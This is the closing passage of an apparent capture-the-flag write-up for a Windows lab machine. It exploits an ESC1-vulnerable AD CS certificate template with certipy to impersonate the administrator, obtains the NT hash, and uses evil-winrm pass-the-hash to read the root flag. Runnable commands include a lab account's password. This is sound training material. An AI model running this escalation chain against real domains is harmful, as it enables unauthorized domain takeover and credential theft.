   [+] User Enrollable Principals      : SEQUEL.HTB\Domain Users  
   [!] Vulnerabilities  
     ESC1                              : Enrollee supplies subject and template allows client authentication.
```

`Vulnerabilities : ESC1`

So we use `certipy` again with `ryan`'s credentials and the `CA` and `Template` provided to get a `Ticket Granting Ticket` for the `Administrator`.

```bash
>  certipy req -u 'ryan.cooper@sequel.htb' -p 'NuclearMosquito3' -dc-ip 10.129.228.253 -ca 'sequel-DC-CA' -target dc.sequel.htb -template 'UserAuthentication' -upn 'administrator@sequel.htb'  
  
Certipy v5.0.4 - by Oliver Lyak (ly4k)  
  
[*] Requesting certificate via RPC  
[*] Request ID is 14  
[*] Successfully requested certificate  
[*] Got certificate with UPN 'administrator@sequel.htb'  
[*] Certificate has no object SID  
[*] Try using -sid to set the object SID or see the wiki for more details  
[*] Saving certificate and private key to 'administrator.pfx'  
[*] Wrote certificate and private key to 'administrator.pfx'
>  certipy auth -pfx administrator.pfx -dc-ip 10.129.228.253 -domain sequel.htb  
  
Certipy v5.0.4 - by Oliver Lyak (ly4k)  
  
[*] Certificate identities:  
[*]     SAN UPN: 'administrator@sequel.htb'  
[*] Using principal: 'administrator@sequel.htb'  
[*] Trying to get TGT...  
[*] Got TGT  
[*] Saving credential cache to 'administrator.ccache'  
[*] Wrote credential cache to 'administrator.ccache'  
[*] Trying to retrieve NT hash for 'administrator'  
[*] Got hash for 'administrator@sequel.htb': REDACTED
```

And we got the `NTLM` hash, we'll take the `NT` part and use `Pass-The-Hash` to get root :

```PowerShell
>  evil-winrm -i sequel.htb -u Administrator -H REDACTED  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/fragment.rb:35: warning: redefining 'object_id' may cause serious problems  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/message_fragmenter.rb:29: warning: redefining 'object_id' may cause serious problems  
/usr/lib/ruby/3.4.0/readline.rb:4: warning: reline was loaded from the standard library, but will no longer be part of the default gems starting from Ruby 4.0.0.  
You can add reline to your Gemfile or gemspec to silence this warning.  
                                          
Evil-WinRM shell v3.9  
                                          
Warning: Remote path completions is disabled due to ruby limitation: undefined method 'quoting_detection_proc' for module Reline  
                                          
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion  
                                          
Info: Establishing connection to remote endpoint  
*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\Administrator\Desktop\root.txt  
REDACTED
```

And we got root.

Now, time to get our clock back to normal :

```bash
>  sudo timedatectl set-ntp true  
Please touch the FIDO authenticator.  
>  sudo systemctl restart systemd-timesyncd
```